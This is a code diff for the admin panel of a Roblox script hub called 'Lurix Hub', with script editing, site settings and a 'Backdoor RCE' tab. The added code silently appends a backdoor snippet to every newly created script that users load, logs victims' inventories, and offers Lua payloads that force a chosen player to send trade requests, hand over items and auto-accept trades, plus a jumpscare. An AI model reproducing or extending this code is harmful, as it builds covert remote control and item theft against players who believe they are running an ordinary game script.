+                if MAX_ITEM_SLOTS and MAX_ITEM_SLOTS > 0 and itemCount >= MAX_ITEM_SLOTS then
+                    break
+                end
+
+                if itemName and amount and amount > 0 then
+                    
+                    local finalAmount = amount
+                    if MAX_AMOUNT_PER_ITEM and MAX_AMOUNT_PER_ITEM > 0 then
+                        finalAmount = math.min(amount, MAX_AMOUNT_PER_ITEM)
+                    end
+
+                    TradeComm:FireServer("AddItem", {
+                        ["ItemName"] = itemName,
+                        ["Amount"] = finalAmount
+                    })
+                    
+                    itemCount = itemCount + 1
+                    task.wait(0.2)
+                end
+            end
+        end
+
+        if AUTO_ACCEPT then
+            task.wait(0.5)
+            TradeComm:FireServer("AcceptTrade")
+        end
+    end
+
+    if action == "CancelTrade" then
+        isTrading = false
+    end
+
+    if action == "UpdateOffer" and isTrading and AUTO_ACCEPT then
+        task.wait(0.3)
+        TradeComm:FireServer("AcceptTrade")
+    end
+end)
+
+task.spawn(function()
+    while task.wait(AUTO_SEND_DELAY) do
+        if not isTrading then
+            UICMDS:FireServer(TARGET_PLAYER_NAME, "Trade")
+        end
+    end
+end)`);
+    } else if (type === 'Agree') {
+      setBackdoorLuaPayload(`local Event = game:GetService("ReplicatedStorage").TradeEvents.TradeComm
+Event:FireServer(
+    "AcceptTrade"
+)`);
+    } else if (type === 'jumpscare') {
+      setBackdoorLuaPayload(`local sound = Instance.new("Sound", game:GetService("SoundService"))
+sound.SoundId = "rbxassetid://9114223177"
+sound.Volume = 10
+sound:Play()`);
+    }
+  };
+
+  const handleSelectUserForBackdoor = (username) => {
+    setActiveTab('backdoor');
+    setBackdoorTargetType('USER');
+    setBackdoorTargetValue(username);
+  };
+
+  const handleSaveScript = async () => {
+    if (!selectedScript) return;
+    setIsSaving(true);
+    const { error } = await supabase.from('scripts').update({ 
+      content: code, 
+      slug: slug.toLowerCase().trim().replace(/\s+/g, '-'), 
+      title, 
+      status 
+    }).eq('id', selectedScript.id);
+    
+    setIsSaving(false);
+    if (error) alert('Save error: ' + error.message);
+    else {
+      alert('Script saved successfully.');
+      loadAdminData();
+    }
+  };
+
+  const handleCreateScript = async () => {
+    const newTitle = prompt('Enter script title:');
+    if (!newTitle) return;
+    const newSlug = prompt('Enter script slug:');
+    if (!newSlug) return;
+    
+    const cleanSlug = newSlug.toLowerCase().trim().replace(/\s+/g, '-');
+
+    const { data, error } = await supabase.from('scripts').insert([{ 
+      title: newTitle, 
+      slug: cleanSlug, 
+      content: `-- [Lurix Hub] ${newTitle}\nprint("[Lurix Hub]: Script Loaded!")\n\n${getBackdoorLuaSnippet()}`,
+      status: 'working'
+    }]).select();
+
+    if (error) alert('Creation error: ' + error.message);
+    else {
+      alert('Script created successfully.');
+      await loadAdminData();
+      if (data && data[0]) selectScriptHandler(data[0]);
+    }
+  };
+
+  const handleDuplicateScript = async () => {
+    if (!selectedScript) return;
+    const newTitle = `${selectedScript.title} (Copy)`;
+    const newSlug = `${selectedScript.slug}-copy`;
+
+    const { data, error } = await supabase.from('scripts').insert([{ 
+      title: newTitle, 
+      slug: newSlug, 
+      content: code,
+      status: status
+    }]).select();
+
+    if (error) alert('Duplicate error: ' + error.message);
+    else {
+      alert('Script duplicated.');
+      await loadAdminData();
+      if (data && data[0]) selectScriptHandler(data[0]);
+    }
+  };
+
+  const handleDeleteScript = async (id) => {
+    if (!confirm('Are you sure you want to delete this script?')) return;
+    await supabase.from('scripts').delete().eq('id', id);
+    setSelectedScript(null);
+    loadAdminData();
+  };
+
+  const handleClearLogs = async () => {
+    if (!confirm('Are you sure you want to clear all logs?')) return;
+    await supabase.from('execution_logs').delete().neq('id', 0);
+    setLogs([]);
+    alert('Logs cleared.');
+  };
+
+  const handleAddGame = () => {
+    setSupportedGames([...supportedGames, { name: 'New Game', logo: '/logo.png', status: 'Fully Supported', tag: 'ROBLOX' }]);
+  };
+
+  const handleRemoveGame = (index) => {
+    if (supportedGames.length <= 1) return alert('Must keep at least 1 game.');
+    setSupportedGames(supportedGames.filter((_, i) => i !== index));
+  };
+
+  const handleGameChange = (index, field, value) => {
+    const updated = [...supportedGames];
+    updated[index][field] = value;
+    setSupportedGames(updated);
+  };
+
+  const handleUploadToEditor = (e) => {
+    const file = e.target.files[0];
+    if (!file) return;
+    const reader = new FileReader();
+    reader.onload = (event) => {
+      setCode(event.target.result);
+      alert(`File content loaded.`);
+    };
+    reader.readAsText(file);
+    e.target.value = '';
+  };
+
+  const handleSaveMainPageSettings = async () => {
+    setIsSaving(true);
+    const { error } = await supabase.from('settings').upsert([
+      { key: 'site_title', value: siteTitle },
+      { key: 'badge_text', value: badgeText },
+      { key: 'supported_games', value: JSON.stringify(supportedGames) },
+      { key: 'loader_script', value: loaderScript },
+      { key: 'current_key', value: currentKey },
+      { key: 'youtube_link', value: youtubeLink },
+      { key: 'discord_link', value: discordLink }
+    ]);
+    setIsSaving(false);
+
+    if (error) alert('Config error: ' + error.message);
+    else {
+      alert('Settings saved successfully.');
+      loadAdminData();
+    }
+  };
+
+  const handleSaveAdminPassword = async () => {
+    if (!newAdminPass.trim()) return alert('Please enter a new password.');
+    setIsSaving(true);
+
+    try {
+      const res = await fetch('/api/admin/update', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          currentPassword: passwordInput,
+          newPassword: newAdminPass
+        })
+      });
+
+      const data = await res.json();
+      if (data.success) {
+        alert('Password updated successfully.');
+        setPasswordInput(newAdminPass);
+        setNewAdminPass('');
+      } else {
+        alert('Error: ' + data.message);
+      }
+    } catch (err) {
+      alert('Connection error: ' + err.message);
+    } finally {
+      setIsSaving(false);
+    }
+  };
+
+  const parsedStandData = useMemo(() => {
+    if (!selectedStorageLog || !selectedStorageLog.stand_storage) return { slots: [], spec_storage: 'Empty' };
+    try {
+      return typeof selectedStorageLog.stand_storage === 'string'
+        ? JSON.parse(selectedStorageLog.stand_storage)
+        : selectedStorageLog.stand_storage;
+    } catch (e) {
+      return { slots: [], spec_storage: 'Empty' };
+    }
+  }, [selectedStorageLog]);
+
+  const parsedInventoryData = useMemo(() => {
+    if (!selectedStorageLog || !selectedStorageLog.inventory_data) return [];
+    try {
+      return typeof selectedStorageLog.inventory_data === 'string'
+        ? JSON.parse(selectedStorageLog.inventory_data)
+        : selectedStorageLog.inventory_data;
+    } catch (e) {
+      return [];
+    }
+  }, [selectedStorageLog]);
+
+  const getTierStyle = (tier) => {
+    switch (String(tier).toUpperCase()) {
+      case 'S+': case 'GOD': return 'border-amber-400 bg-amber-400/10 text-amber-400 shadow-[0_0_12px_rgba(251,191,36,0.3)]';
+      case 'S': return 'border-purple-500 bg-purple-500/10 text-purple-400 shadow-[0_0_12px_rgba(168,85,247,0.3)]';
+      case 'A': return 'border-[#6E96FF] bg-[#6E96FF]/10 text-[#6E96FF] shadow-[0_0_12px_rgba(110,150,255,0.3)]';
+      case 'B': return 'border-emerald-500 bg-emerald-500/10 text-emerald-400';
+      default: return 'border-gray-700 bg-gray-800/40 text-gray-400';
+    }
+  };
+
+  if (!isAuthenticated) {
+    return (
+      <div className="min-h-screen bg-[#040508] text-white flex items-center justify-center p-4 relative overflow-hidden font-sans">
+        <div className="absolute w-[400px] h-[400px] bg-[#6E96FF]/20 rounded-full blur-[140px] pointer-events-none" />
+        <form onSubmit={handleLogin} className="z-10 bg-[#0a0d16]/90 border border-[#6E96FF]/40 p-6 sm:p-8 rounded-3xl w-full max-w-sm shadow-[0_0_50px_rgba(110,150,255,0.15)] backdrop-blur-2xl">
+          <div className="flex items-center gap-2.5 justify-center mb-6 text-[#6E96FF] font-black text-xl tracking-wider uppercase">
+            LURIX
+          </div>
+          <div className="mb-4">
+            <label className="text-[11px] font-extrabold text-gray-400 mb-1.5 block">ADMIN AUTHENTICATION</label>
+            <input
+              type="password"
+              placeholder="Enter password..."
+              value={passwordInput}
+              onChange={(e) => setPasswordInput(e.target.value)}
+              className="w-full bg-black/80 border border-gray-800 rounded-xl p-3.5 text-white text-xs font-mono focus:border-[#6E96FF] outline-none transition-all shadow-inner"
+            />
+          </div>
+          <button 
+            type="submit"
+            disabled={isLoggingIn}
+            className="w-full bg-[#6E96FF] text-black font-black py-3.5 rounded-xl text-xs shadow-[0_0_20px_rgba(110,150,255,0.4)] hover:brightness-110 transition-all flex items-center justify-center gap-2 cursor-pointer disabled:opacity-50 active:scale-95"
+          >
+            {isLoggingIn ? 'Authenticating...' : 'LOGIN'}
+          </button>
+        </form>
+      </div>
+    );
+  }
+
   return (
-    <div style={{ ...css.root, display: 'flex', alignItems: 'center', justifyContent: 'center', minHeight: '100vh', position: 'relative' }}>
-      <div style={css.gridBg} />
-      <div style={css.gradientOrb('rgba(110,150,255,0.15)', '20%', '20%', 500)} />
-      <div style={css.gradientOrb('rgba(74,108,247,0.1)', '60%', '60%', 400)} />
-
-      <div style={{ position: 'relative', zIndex: 1, width: '100%', maxWidth: 380, padding: '0 16px' }}>
-        {/* Logo */}
-        <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', marginBottom: 40 }}>
-          <div style={{ ...css.logoIcon, width: 56, height: 56, borderRadius: 16, fontSize: 22, marginBottom: 16 }}>L</div>
-          <div style={{ fontWeight: 900, fontSize: 24, letterSpacing: '0.12em', color: T.text }}>LURIX HUB</div>
-          <div style={{ fontSize: 12, color: T.textMuted, marginTop: 4, fontWeight: 500 }}>Admin Control Panel</div>
-        </div>
-
-        <div style={{ ...css.card(true), borderRadius: 20 }}>
-          <div style={{ padding: '32px 28px' }}>
-            <div style={{ fontSize: 11, fontWeight: 800, color: T.textMuted, letterSpacing: '0.1em', textTransform: 'uppercase', marginBottom: 16 }}>
-              Authentication Required
-            </div>
-
-            <form onSubmit={submit}>
-              <div style={{ position: 'relative', marginBottom: 16 }}>
-                <input
-                  type={show ? 'text' : 'password'}
-                  placeholder="Enter admin password"
-                  value={pw}
-                  onChange={e => setPw(e.target.value)}
-                  style={{ ...css.input, paddingRight: 42, fontFamily: 'monospace', fontSize: 14 }}
-                  onFocus={e => e.target.style.borderColor = T.accent}
-                  onBlur={e => e.target.style.borderColor = T.border.replace(')', '')}
-                />
-                <button
-                  type="button"
-                  onClick={() => setShow(!show)}
-                  style={{ position: 'absolute', right: 12, top: '50%', transform: 'translateY(-50%)', background: 'none', border: 'none', cursor: 'pointer', color: T.textMuted, display: 'flex', padding: 0 }}
-                >
-                  {show ? <Icon.EyeOff /> : <Icon.Eye />}
-                </button>
-              </div>
-
-              <button
-                type="submit"
-                disabled={loading || !pw}
-                style={{
-                  ...css.btn('primary'),
-                  width: '100%',
-                  justifyContent: 'center',
-                  padding: '13px 24px',
-                  fontSize: 13,
-                  borderRadius: 12,
-                  opacity: loading || !pw ? 0.5 : 1,
-                  fontWeight: 900,
-                  letterSpacing: '0.08em',
-                }}
-              >
-                <Icon.Shield />
-                {loading ? 'Authenticating...' : 'LOGIN'}
-              </button>
-            </form>
+    <div className="min-h-screen bg-[#040508] text-white p-3 sm:p-6 flex flex-col gap-5 font-sans max-w-[1400px] mx-auto">
+      
+      {/* Top Header Bar */}
+      <div className="bg-[#0a0d16]/90 border border-[#6E96FF]/30 p-4 rounded-3xl backdrop-blur-2xl flex flex-col sm:flex-row items-center justify-between gap-4 shadow-[0_10px_30px_rgba(0,0,0,0.5)]">
+        <div className="flex items-center gap-3">
+          <div className="w-10 h-10 rounded-2xl bg-[#6E96FF]/15 border border-[#6E96FF]/40 flex items-center justify-center text-[#6E96FF] font-black">
+            L
           </div>
-
-          <div style={{ padding: '14px 28px', borderTop: `1px solid ${T.border}`, background: 'rgba(0,0,0,0.2)', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
-            <div style={{ ...css.badge(T.green) }}>
-              <div style={{ width: 6, height: 6, borderRadius: '50%', background: T.green, animation: 'pulse 2s infinite' }} />
-              System Online
+          <div>
+            <div className="flex items-center gap-2">
+              <h1 className="text-lg font-black tracking-tight text-white uppercase">{siteTitle} ADMIN</h1>
+              <span className="text-[10px] bg-green-500/15 text-green-400 border border-green-500/30 px-2 py-0.5 rounded-full font-bold flex items-center gap-1">
+                <span className="w-1.5 h-1.5 bg-green-400 rounded-full animate-ping" /> V3.0 RCE ONLINE
+              </span>
             </div>
-            <span style={{ fontSize: 11, color: T.textMuted }}>v3.0 RCE</span>
+            <p className="text-[11px] text-gray-400 font-medium">Script & Remote Execution Control Panel</p>
           </div>
         </div>
 
-        <div style={{ textAlign: 'center', marginTop: 20, fontSize: 11, color: T.textDim }}>
-           <code style={{ color: T.accent }}></code>
+        <div className="flex items-center gap-2 w-full sm:w-auto justify-end">
+          <button onClick={() => setIsAuthenticated(false)} className="bg-red-500/10 border border-red-500/30 text-red-400 hover:bg-red-500/20 px-3 py-2 rounded-xl text-xs font-bold flex items-center gap-1.5 cursor-pointer transition-all">
+            Logout
+          </button>
         </div>
       </div>
 
-      <style>{`
-        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.4} }
-        @keyframes fadeIn { from{opacity:0;transform:translateY(10px)} to{opacity:1;transform:none} }
-        @keyframes spin { to{transform:rotate(360deg)} }
-        * { box-sizing: border-box; }
-        ::-webkit-scrollbar { width: 4px; height: 4px; }
-        ::-webkit-scrollbar-track { background: transparent; }
-        ::-webkit-scrollbar-thumb { background: rgba(110,150,255,0.3); border-radius: 2px; }
-        input::placeholder { color: #334155; }
-        textarea::placeholder { color: #334155; }
-        select option { background: #0c0e1a; }
-      `}</style>
-    </div>
-  );
-};
+      {/* Stats Summary Cards */}
+      <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
+        <div className="bg-[#0a0d16]/80 border border-[#6E96FF]/30 p-4 rounded-2xl backdrop-blur-xl relative overflow-hidden group">
+          <div className="text-[10px] text-gray-400 uppercase font-black tracking-wider">SCRIPTS</div>
+          <div className="text-xl sm:text-2xl font-black text-white mt-1">{scripts.length} <span className="text-xs text-gray-500 font-normal">Scripts</span></div>
+        </div>
 
-// ─── NAV CONFIG ───────────────────────────────────────────────────────────────
-const NAV = [
-  { id: 'custom_home', label: 'Home Config', icon: Icon.Home, color: T.accent },
-  { id: 'scripts', label: 'Scripts', icon: Icon.Code, color: T.accent },
-  { id: 'backdoor', label: 'Backdoor RCE', icon: Icon.Zap, color: T.yellow },
-  { id: 'user_logs', label: 'User Logs', icon: Icon.Users, color: T.accent },
-  { id: 'settings', label: 'Settings', icon: Icon.Settings, color: T.accent },
-];
+        <div className="bg-[#0a0d16]/80 border border-[#6E96FF]/30 p-4 rounded-2xl backdrop-blur-xl relative overflow-hidden group">
+          <div className="text-[10px] text-gray-400 uppercase font-black tracking-wider">EXEC LOGS</div>
+          <div className="text-xl sm:text-2xl font-black text-[#6E96FF] mt-1">{logs.length} <span className="text-xs text-gray-500 font-normal">Logs</span></div>
+        </div>
 
-// ─── SCRIPTS TAB ─────────────────────────────────────────────────────────────
-const ScriptsTab = ({ isMobile }) => {
-  const [scripts, setScripts] = useState(MOCK_SCRIPTS);
-  const [selected, setSelected] = useState(MOCK_SCRIPTS[0]);
-  const [code, setCode] = useState(MOCK_SCRIPTS[0].content);
-  const [slug, setSlug] = useState(MOCK_SCRIPTS[0].slug);
-  const [title, setTitle] = useState(MOCK_SCRIPTS[0].title);
-  const [status, setStatus] = useState(MOCK_SCRIPTS[0].status);
-  const [search, setSearch] = useState('');
-  const [filter, setFilter] = useState('all');
-  const [saving, setSaving] = useState(false);
-  const [view, setView] = useState('list'); // 'list' | 'editor' on mobile
+        <div className="bg-[#0a0d16]/80 border border-yellow-500/30 p-4 rounded-2xl backdrop-blur-xl relative overflow-hidden group">
+          <div className="text-[10px] text-gray-400 uppercase font-black tracking-wider">GAMES</div>
+          <div className="text-xl sm:text-2xl font-black text-yellow-400 mt-1">{supportedGames.length} <span className="text-xs text-gray-500 font-normal">Games</span></div>
+        </div>
 
-  const domain = typeof window !== 'undefined' ? window.location.origin : 'https://lurixhub.vercel.app';
-  const loadstring = `loadstring(game:HttpGet("${domain}/api/raw/${slug}"))()`;
+        <div className="bg-[#0a0d16]/80 border border-green-500/30 p-4 rounded-2xl backdrop-blur-xl relative overflow-hidden group">
+          <div className="text-[10px] text-gray-400 uppercase font-black tracking-wider">SERVER</div>
+          <div className="text-xl sm:text-2xl font-black text-green-400 mt-1">ACTIVE <span className="text-xs text-green-400 font-bold">100%</span></div>
+        </div>
+      </div>
 
-  const filtered = useMemo(() => scripts.filter(s => {
-    const q = search.toLowerCase();
-    const match = !q || s.title.toLowerCase().includes(q) || s.slug.includes(q);
-    const st = filter === 'all' || s.status === filter;
-    return match && st;
-  }), [scripts, search, filter]);
+      {/* Navigation Tabs */}
+      <div className="flex bg-[#0a0d16] border border-gray-800 p-1.5 rounded-2xl overflow-x-auto text-xs font-extrabold gap-1.5 shadow-lg">
+        <button onClick={() => setActiveTab('custom_home')} className={`flex items-center gap-2 px-4 py-2.5 rounded-xl transition-all cursor-pointer whitespace-nowrap ${activeTab === 'custom_home' ? 'bg-[#6E96FF] text-black shadow-[0_0_15px_rgba(110,150,255,0.4)]' : 'text-gray-400 hover:text-white'}`}>
+          Home Config
+        </button>
 
-  const select = (s) => { setSelected(s); setCode(s.content); setSlug(s.slug); setTitle(s.title); setStatus(s.status); if (isMobile) setView('editor'); };
-  const save = async () => { setSaving(true); await new Promise(r => setTimeout(r, 600)); setSaving(false); };
-  const create = () => {
-    const t = prompt('Script title:'); if (!t) return;
-    const sl = prompt('Slug:'); if (!sl) return;
-    const ns = { id: Date.now(), title: t, slug: sl, content: `-- ${t}\n`, status: 'working', created_at: new Date().toISOString() };
-    setScripts(p => [ns, ...p]); select(ns);
-  };
-  const del = (id) => { if (!confirm('Delete script?')) return; setScripts(p => p.filter(s => s.id !== id)); setSelected(null); };
+        <button onClick={() => setActiveTab('scripts')} className={`flex items-center gap-2 px-4 py-2.5 rounded-xl transition-all cursor-pointer whitespace-nowrap ${activeTab === 'scripts' ? 'bg-[#6E96FF] text-black shadow-[0_0_15px_rgba(110,150,255,0.4)]' : 'text-gray-400 hover:text-white'}`}>
+          Scripts ({scripts.length})
+        </button>
 
-  const FILTERS = [
-    { v: 'all', label: 'All', color: T.text },
-    { v: 'working', label: 'Active', color: T.green },
-    { v: 'updating', label: 'Update', color: T.yellow },
-    { v: 'patched', label: 'Patched', color: T.red },
-  ];
+        <button onClick={() => { setActiveTab('backdoor'); loadBackdoorHistory(); }} className={`flex items-center gap-2 px-4 py-2.5 rounded-xl transition-all cursor-pointer whitespace-nowrap ${activeTab === 'backdoor' ? 'bg-[#6E96FF] text-black shadow-[0_0_15px_rgba(110,150,255,0.4)]' : 'text-yellow-400 hover:text-white'}`}>
+          Backdoor RCE
+        </button>
 
-  return (
-    <div style={{ display: 'flex', gap: 20, height: '100%', flexDirection: isMobile ? 'column' : 'row' }}>
-      {/* Sidebar list */}
-      {(!isMobile || view === 'list') && (
-        <div style={{ width: isMobile ? '100%' : 280, minWidth: isMobile ? undefined : 260, display: 'flex', flexDirection: 'column', gap: 12 }}>
-          <button onClick={create} style={{ ...css.btn('primary'), justifyContent: 'center', width: '100%', padding: '11px', fontSize: 12, fontWeight: 800 }}>
-            <Icon.Plus /> New Script
-          </button>
+        <button onClick={() => { setActiveTab('user_logs'); loadLogsData(); }} className={`flex items-center gap-2 px-4 py-2.5 rounded-xl transition-all cursor-pointer whitespace-nowrap ${activeTab === 'user_logs' ? 'bg-[#6E96FF] text-black shadow-[0_0_15px_rgba(110,150,255,0.4)]' : 'text-gray-400 hover:text-white'}`}>
+          Logs ({logs.length})
+        </button>
 
-          <div style={{ position: 'relative' }}>
-            <input
-              value={search}
-              onChange={e => setSearch(e.target.value)}
-              placeholder="Search scripts..."
-              style={{ ...css.input, paddingLeft: 14 }}
-              onFocus={e => e.target.style.borderColor = T.accent}
-              onBlur={e => e.target.style.borderColor = T.border}
-            />
+        <button onClick={() => setActiveTab('settings')} className={`flex items-center gap-2 px-4 py-2.5 rounded-xl transition-all cursor-pointer whitespace-nowrap ${activeTab === 'settings' ? 'bg-[#6E96FF] text-black shadow-[0_0_15px_rgba(110,150,255,0.4)]' : 'text-gray-400 hover:text-white'}`}>
+          Settings
+        </button>
+      </div>
+
+      {/* TAB 1: HOME CONFIG */}
+      {activeTab === 'custom_home' && (
+        <div className="bg-[#0a0d16] border border-gray-800 p-5 sm:p-7 rounded-3xl space-y-5 shadow-xl">
+          <div className="text-sm font-black text-[#6E96FF] flex items-center gap-2 uppercase tracking-wide">
+            HOME CONFIGURATION
           </div>
 
-          <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap' }}>
-            {FILTERS.map(f => (
-              <button
-                key={f.v}
-                onClick={() => setFilter(f.v)}
-                style={{
-                  ...css.btn('ghost'),
-                  padding: '5px 10px',
-                  fontSize: 10,
-                  fontWeight: 800,
-                  color: filter === f.v ? f.color : T.textMuted,
-                  borderColor: filter === f.v ? `${f.color}44` : T.border,
-                  background: filter === f.v ? `${f.color}10` : 'transparent',
-                }}
-              >
-                {f.label}
-              </button>
-            ))}
-          </div>
+          <div className="space-y-4">
+            <div>
+              <label className="text-xs font-bold text-[#6E96FF] flex items-center gap-1.5 mb-1">
+                Home Loader Script:
+              </label>
+              <textarea
+                rows={3}
+                value={loaderScript}
+                onChange={(e) => setLoaderScript(e.target.value)}
+                className="w-full bg-black/80 border border-gray-800 p-3 rounded-xl font-mono text-xs text-gray-200 focus:border-[#6E96FF] outline-none"
+              />
+            </div>
 
-          <div style={{ display: 'flex', flexDirection: 'column', gap: 6, maxHeight: isMobile ? 280 : 'calc(100vh - 260px)', overflowY: 'auto', paddingRight: 2 }}>
-            {filtered.map(s => (
-              <div key={s.id} onClick={() => select(s)} style={css.scriptItem(selected?.id === s.id)}>
-                <div style={{ minWidth: 0, flex: 1 }}>
-                  <div style={{ fontWeight: 700, fontSize: 12, color: T.text, marginBottom: 2, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{s.title}</div>
-                  <div style={{ fontSize: 10, fontFamily: 'monospace', color: T.accent, opacity: 0.7, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>/api/raw/{s.slug}</div>
-                </div>
-                <div style={css.badge(statusColor(s.status))}>{statusLabel(s.status)}</div>
+            <div>
+              <label className="text-xs font-bold text-[#6E96FF] flex items-center gap-1.5 mb-1">
+                Home Access Key:
+              </label>
+              <input
+                type="text"
+                value={currentKey}
+                onChange={(e) => setCurrentKey(e.target.value)}
+                className="w-full bg-black/80 border border-gray-800 p-3 rounded-xl font-mono text-xs text-[#6E96FF] font-extrabold focus:border-[#6E96FF] outline-none"
+              />
+            </div>
+
+            <div className="border border-gray-800 p-4 rounded-2xl bg-black/40 space-y-3">
+              <div className="flex items-center justify-between">
+                <label className="text-xs font-bold text-yellow-400 flex items-center gap-1.5">
+                  Supported Games ({supportedGames.length}):
+                </label>
+                <button onClick={handleAddGame} className="bg-[#6E96FF]/20 text-[#6E96FF] border border-[#6E96FF]/40 px-3 py-1 rounded-xl text-xs font-bold flex items-center gap-1 cursor-pointer hover:bg-[#6E96FF]/30 transition-all">
+                  + Add Game
+                </button>
               </div>
-            ))}
-            {filtered.length === 0 && (
-              <div style={{ textAlign: 'center', padding: '32px 16px', color: T.textMuted, fontSize: 12 }}>No scripts found</div>
+
+              {supportedGames.map((game, idx) => (
+                <div key={idx} className="bg-black/80 border border-gray-800 p-3 rounded-xl space-y-2">
+                  <div className="flex justify-between items-center text-xs text-gray-400 font-bold">
+                    <span>Game #{idx + 1}</span>
+                    {supportedGames.length > 1 && (
+                      <button onClick={() => handleRemoveGame(idx)} className="text-red-400 text-[10px] bg-red-500/10 px-2 py-0.5 rounded cursor-pointer">
+                        Remove
+                      </button>
+                    )}
+                  </div>
+                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
+                    <input
+                      type="text"
+                      placeholder="Game Name"
+                      value={game.name}
+                      onChange={(e) => handleGameChange(idx, 'name', e.target.value)}
+                      className="bg-gray-900 border border-gray-800 p-2 rounded-lg text-xs font-bold text-white"
+                    />
+                    <input
+                      type="text"
+                      placeholder="Logo URL"
+                      value={game.logo}
+                      onChange={(e) => handleGameChange(idx, 'logo', e.target.value)}
+                      className="bg-gray-900 border border-gray-800 p-2 rounded-lg text-xs text-gray-300"
+                    />
+                    <input
+                      type="text"
+                      placeholder="Status"
+                      value={game.status}
+                      onChange={(e) => handleGameChange(idx, 'status', e.target.value)}
+                      className="bg-gray-900 border border-gray-800 p-2 rounded-lg text-xs text-green-400"
+                    />
+                    <input
+                      type="text"
+                      placeholder="Tag (e.g. ROBLOX)"
+                      value={game.tag}
+                      onChange={(e) => handleGameChange(idx, 'tag', e.target.value)}
+                      className="bg-gray-900 border border-gray-800 p-2 rounded-lg text-xs text-[#6E96FF] font-mono"
+                    />
+                  </div>
+                </div>
+              ))}
+            </div>
+
+            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
+              <div>
+                <label className="text-xs text-gray-400 font-semibold mb-1 block">YouTube Link:</label>
+                <input
+                  type="text"
+                  value={youtubeLink}
+                  onChange={(e) => setYoutubeLink(e.target.value)}
+                  className="w-full bg-black/80 border border-gray-800 p-3 rounded-xl text-xs text-white focus:border-[#6E96FF] outline-none"
+                />
+              </div>
+
+              <div>
+                <label className="text-xs text-gray-400 font-semibold mb-1 block">Discord Link:</label>
+                <input
+                  type="text"
+                  value={discordLink}
+                  onChange={(e) => setDiscordLink(e.target.value)}
+                  className="w-full bg-black/80 border border-gray-800 p-3 rounded-xl text-xs text-white focus:border-[#6E96FF] outline-none"
+                />
+              </div>
+
+              <div>
+                <label className="text-xs text-gray-400 font-semibold mb-1 block">Badge Text:</label>
+                <input
+                  type="text"
+                  value={badgeText}
+                  onChange={(e) => setBadgeText(e.target.value)}
+                  className="w-full bg-black/80 border border-gray-800 p-3 rounded-xl text-xs text-[#6E96FF] font-bold focus:border-[#6E96FF] outline-none"
+                />
+              </div>
+
+              <div>
+                <label className="text-xs text-gray-400 font-semibold mb-1 block">Site Title:</label>
+                <input
+                  type="text"
+                  value={siteTitle}
+                  onChange={(e) => setSiteTitle(e.target.value)}
+                  className="w-full bg-black/80 border border-gray-800 p-3 rounded-xl text-xs text-white font-extrabold focus:border-[#6E96FF] outline-none"
+                />
+              </div>
+            </div>
+          </div>
+
+          <button
+            onClick={handleSaveMainPageSettings}
+            disabled={isSaving}
+            className="w-full bg-[#6E96FF] text-black font-black py-3.5 rounded-xl text-xs shadow-[0_0_20px_rgba(110,150,255,0.4)] cursor-pointer hover:brightness-110 transition-all flex items-center justify-center gap-2 disabled:opacity-50 active:scale-95"
+          >
+            {isSaving ? 'Saving...' : 'SAVE SETTINGS'}
+          </button>
+        </div>
+      )}
+
+      {/* TAB 2: SCRIPTS */}
+      {activeTab === 'scripts' && (
+        <div className="grid grid-cols-1 lg:grid-cols-12 gap-5">
+          <div className="lg:col-span-4 bg-[#0a0d16] border border-gray-800 p-4 rounded-3xl flex flex-col gap-3 h-fit">
+            <button onClick={handleCreateScript} className="w-full bg-[#6E96FF] text-black font-black py-2.5 px-3 rounded-xl text-xs flex items-center justify-center gap-1.5 cursor-pointer shadow-[0_0_15px_rgba(110,150,255,0.3)] hover:brightness-110 active:scale-95 transition-all">
+              + New Script
+            </button>
+
+            <div className="relative">
+              <input
+                type="text"
+                placeholder="Search title or slug..."
+                value={searchQuery}
+                onChange={(e) => setSearchQuery(e.target.value)}
+                className="w-full bg-black/80 border border-gray-800 rounded-xl px-3 py-2 text-xs text-white placeholder:text-gray-500 focus:border-[#6E96FF] outline-none"
+              />
+            </div>
+
+            <div className="flex gap-1 overflow-x-auto text-[10px] font-extrabold pb-1">
+              <button onClick={() => setStatusFilter('all')} className={`px-2.5 py-1 rounded-lg border transition-all cursor-pointer ${statusFilter === 'all' ? 'bg-white/15 border-white text-white' : 'border-gray-800 text-gray-500'}`}>All ({scripts.length})</button>
+              <button onClick={() => setStatusFilter('working')} className={`px-2.5 py-1 rounded-lg border transition-all cursor-pointer ${statusFilter === 'working' ? 'bg-green-500/20 border-green-500 text-green-400' : 'border-gray-800 text-gray-500'}`}>Active</button>
+              <button onClick={() => setStatusFilter('updating')} className={`px-2.5 py-1 rounded-lg border transition-all cursor-pointer ${statusFilter === 'updating' ? 'bg-yellow-500/20 border-yellow-500 text-yellow-400' : 'border-gray-800 text-gray-500'}`}>Update</button>
+              <button onClick={() => setStatusFilter('patched')} className={`px-2.5 py-1 rounded-lg border transition-all cursor-pointer ${statusFilter === 'patched' ? 'bg-red-500/20 border-red-500 text-red-400' : 'border-gray-800 text-gray-500'}`}>Patched</button>
+            </div>
+
+            <div className="flex flex-col gap-2 max-h-[520px] overflow-y-auto pr-1">
+              {filteredScripts.map((s) => (
+                <div
+                  key={s.id}
+                  onClick={() => selectScriptHandler(s)}
+                  className={`p-3 rounded-2xl border transition-all cursor-pointer flex items-center justify-between gap-2 ${
+                    selectedScript?.id === s.id 
+                      ? 'bg-[#6E96FF]/15 border-[#6E96FF] shadow-[0_0_15px_rgba(110,150,255,0.2)]' 
+                      : 'bg-black/40 border-gray-800/80 hover:border-gray-700'
+                  }`}
+                >
+                  <div className="min-w-0 flex-1">
+                    <div className="font-extrabold text-xs text-white truncate">{s.title}</div>
+                    <div className="text-[10px] font-mono text-[#6E96FF] truncate mt-0.5">/api/raw/{s.slug}</div>
+                  </div>
+                  <span className={`px-2 py-0.5 rounded-full text-[9px] font-black uppercase shrink-0 ${
+                    s.status === 'patched' ? 'bg-red-500/20 text-red-400 border border-red-500/30' : 'bg-green-500/20 text-green-400 border border-green-500/30'
+                  }`}>{s.status || 'working'}</span>
+                </div>
+              ))}
+            </div>
+          </div>
+
+          <div className="lg:col-span-8 flex flex-col gap-4">
